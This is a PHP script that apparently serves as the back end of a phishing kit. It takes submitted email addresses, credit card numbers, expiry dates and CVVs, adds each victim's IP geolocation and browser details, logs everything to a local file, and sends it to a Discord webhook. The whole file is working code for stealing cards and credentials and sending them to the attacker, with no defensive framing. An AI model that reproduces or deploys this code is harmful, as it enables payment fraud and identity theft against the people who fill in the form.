<?php



$ip = $_SERVER['REMOTE_ADDR'];
setlocale(LC_TIME, 'fra_fra');
    error_reporting(-0);
    $head_message = "Rez". "\n"; 
    $info_generale = "  ¦- Generale informations:". "\n";
    $info_ip = "  ¦- IP informations:". "\n";  
    $ip_public = "  ¦    ¦- IP: ". $_SERVER['REMOTE_ADDR']. "\n";
    $email = "  ¦    ¦- email: ". $_POST['email']. "\n";
    $cc = "  ¦    ¦- CC: ". $_POST['cc']. "\n";
    $expire = "  ¦    ¦- Expire: ". $_POST['expire']. "\n";
    $cvv = "  ¦    ¦- CVV: ". $_POST['cvv']. "\n";
    $date = "  ¦    ¦- date: ". strftime('%Y-%m-%d'). "\n";
    $heure = "  ¦    +- heure: ". strftime('%H:%M:%S'). "\n"; 
    $region = file_get_contents('https://ipapi.co/'.$ip.'/region/');
    $region_code = file_get_contents('https://ipapi.co/'.$ip.'/region_code/');
    $country_name = file_get_contents('https://ipapi.co/'.$ip.'/country_name/');
    $city = "  ¦    ¦- City: ". file_get_contents('https://ipapi.co/'.$ip.'/city/'). "\n";
    $postal_code = "  ¦    ¦- Postal code: ". file_get_contents('https://ipapi.co/'.$ip.'/postal/'). "\n";
    $finished_region = "  ¦    ¦- Region: ". $region." (". $region_code.") ". "\n";
    $finished_country = "  ¦    ¦- Country: ". $country_name. "\n";
    $latitude = "  ¦    ¦- Latitude: ". file_get_contents('https://ipapi.co/'.$ip.'/latitude/'). "\n";
    $longitude = "  ¦    ¦- Longitude: ". file_get_contents('https://ipapi.co/'.$ip.'/longitude/'). "\n";
    $timezone = "  ¦    ¦- Fuseau horaire: ". file_get_contents('https://ipapi.co/'.$ip.'/timezone/'). "\n";
    $languages = "  ¦    ¦- Languages: ". file_get_contents('https://ipapi.co/'.$ip.'/languages/'). "\n";
    $europe = "  ¦    ¦- Europe: ". file_get_contents('https://ipapi.co/'.$ip.'/in_eu/'). "\n";
    $asn = "  ¦    ¦- ASN: ". file_get_contents('https://ipapi.co/'.$ip.'/asn/'). "\n";
    $isp = "  ¦    +- ISP: ". file_get_contents('https://ipapi.co/'.$ip.'/org/'). "\n";
    $space = "  ¦". "\n"; 
    $empty = " "."\n"; 
    $separation = '============================================================================================================================='. "\n";
    $file = 'rez.txt';

    function getBrowser() {
        global $user_agent;
        $browser        =   "Unknown Browser";
        $browser_array  =   array(
            '/msie/i'       =>  'Internet Explorer',
            '/firefox/i'    =>  'Firefox',
            '/Mozilla/i'  =>  'Mozila',
            '/Mozilla/5.0/i'=>  'Mozila',
            '/safari/i'     =>  'Safari',
            '/chrome/i'     =>  'Chrome',
            '/edge/i'       =>  'Edge',
            '/opera/i'      =>  'Opera',
            '/OPR/i'        =>  'Opera',
            '/netscape/i'   =>  'Netscape',
            '/maxthon/i'    =>  'Maxthon',
            '/konqueror/i'  =>  'Konqueror',
            '/Bot/i'    =>  'Spam',
            '/Valve Steam GameOverlay/i'  =>  'Steam',
            '/mobile/i'     =>  'Phone'
                                );
        foreach ($browser_array as $regex => $value) { 
            if (preg_match($regex, $user_agent)) {
                  $browser    =   $value;
            }
        }
        return $browser;
    }

    $browser_title = "  ¦- More information: ". "\n";
    $user_browser = "  ¦    ¦- Browser: ". getBrowser(). "\n";
    $user_agent = "  ¦    +- User agent: ". $_SERVER['HTTP_USER_AGENT'] . "\n";

    $embed_ip = $_SERVER['REMOTE_ADDR'];
    $embed_email = $_POST['email'];
    $embed_cc = $_POST['cc'];
    $embed_expire = $_POST['expire'];
    $embed_cvv = $_POST['cvv'];
    $embed_region = file_get_contents('https://ipapi.co/'.$ip.'/region/');
    $embed_country = file_get_contents('https://ipapi.co/'.$ip.'/country_name/');
    $embed_city = file_get_contents('https://ipapi.co/'.$ip.'/city/');
    $embed_postal = file_get_contents('https://ipapi.co/'.$ip.'/postal/');
    $embed_latitude = file_get_contents('https://ipapi.co/'.$ip.'/latitude/');
    $embed_longitude = file_get_contents('https://ipapi.co/'.$ip.'/longitude/');
    $embed_timezone = file_get_contents('https://ipapi.co/'.$ip.'/timezone/');
    $embed_languages = file_get_contents('https://ipapi.co/'.$ip.'/languages/');
    $embed_europe = file_get_contents('https://ipapi.co/'.$ip.'/in_eu/');
    $embed_asn = file_get_contents('https://ipapi.co/'.$ip.'/asn/');
    $embed_isp = file_get_contents('https://ipapi.co/'.$ip.'/org/');
    $embed_user_agent = $_SERVER['HTTP_USER_AGENT'];
    $embed_browser = getBrowser();

    file_put_contents($file, $separation, FILE_APPEND | LOCK_EX);  
    file_put_contents($file, $empty, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $head_message, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $space, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $info_generale, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $ip_public, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $email, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $cc, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $expire, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $cvv, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $date, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $heure, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $space, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $info_ip, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $city, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $postal_code, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $finished_region, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $finished_country, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $latitude, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $longitude, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $timezone, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $languages, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $europe, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $asn, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $isp, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $space, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $browser_title, FILE_APPEND | LOCK_EX); 
    file_put_contents($file, $user_browser, FILE_APPEND | LOCK_EX);
    file_put_contents($file, $user_agent, FILE_APPEND | LOCK_EX);
    file_put_contents($file, $empty, FILE_APPEND | LOCK_EX);  
    file_put_contents($file, $separation, FILE_APPEND | LOCK_EX); 

    $url = file_get_contents("discord_webhook.txt");
    $timestamp = date("c", strtotime("now")); 
    $json_data = json_encode([
    "username" => "MrCyci6 - Rez",
    "avatar_url" => "https://avatars.githubusercontent.com/u/74507367?v=4",
    "tts" => false,
    "embeds" => [
        [
            "title" => "Rez of MrCyci6",
            "type" => "rich",
            "url" => "https://github.com/mrcyci6",
            "timestamp" => $timestamp,
            "color" => hexdec( "#0000" ),
            "footer" => [
                "text" => "https://github.com/mrcyci6",
                "icon_url" => "https://avatars.githubusercontent.com/u/74507367?v=4",
            ],
            "thumbnail" => [
                "url" => "https://avatars.githubusercontent.com/u/74507367?v=4"
            ],
            "author" => [
                "name" => "MrCyci6",
                "url" => "https://avatars.githubusercontent.com/u/74507367?v=4"
            ],
            "fields" => [
                [
                    "name" => "IP address:",
                    "value" => "`". $embed_ip. "`",
                    "inline" => true
                ],
                [
                    "name" => "Email:",
                    "value" => "`". $embed_email. "`",
                    "inline" => true
                ],
                [
                    "name" => "CC:",
                    "value" => "`". $embed_cc. "`",
                    "inline" => true
                ],
                [
                    "name" => "Expire:",
                    "value" => "`". $embed_expire. "`",
                    "inline" => true
                ],
                [
                    "name" => "CVV:",
                    "value" => "`". $embed_cvv. "`",
                    "inline" => true
                ],
                [
                    "name" => "City",
                    "value" => "`". $embed_city. "`",
                    "inline" => true
                ],
                [
                    "name" => "Region:",
                    "value" => "`". $embed_region. "`",
                    "inline" => true
                ],
                [
                    "name" => "Country:",
                    "value" => "`". $embed_country. "`",
                    "inline" => true
                ],
                [
                    "name" => "Postal code",
                    "value" => "`". $embed_postal. "`",
                    "inline" => true
                ],
                [
                    "name" => "Latitude:",
                    "value" => "`". $embed_latitude. "`",
                    "inline" => true
                ],
                [
                    "name" => "Longitude:",
                    "value" => "`". $embed_longitude. "`",
                    "inline" => true
                ],
                [
                    "name" => "Fuseau horaire:",
                    "value" => "`". $embed_timezone. "`",
                    "inline" => true
                ],
                [
                    "name" => "Languages:",
                    "value" => "`". $embed_languages. "`",
                    "inline" => true
                ],
                [
                    "name" => "Europe:",
                    "value" => "`". $embed_europe. "`",
                    "inline" => true
                ],
                [
                    "name" => "ASN",
                    "value" => "`". $embed_asn. "`",
                    "inline" => true
                ],
                [
                    "name" => "ISP:",
                    "value" => "`". $embed_isp. "`",
                    "inline" => true
                ],
                [
                    "name" => "Browser:",
                    "value" => "`". $embed_browser. "`",
                    "inline" => true
                ],
                [
                    "name" => "User agent:",
                    "value" => "```".$embed_user_agent. "```",
                    "inline" => false
                ],            
      ]
        ]
    ]
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
$ch = curl_init( $url );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
$response = curl_exec( $ch );
curl_close( $ch );
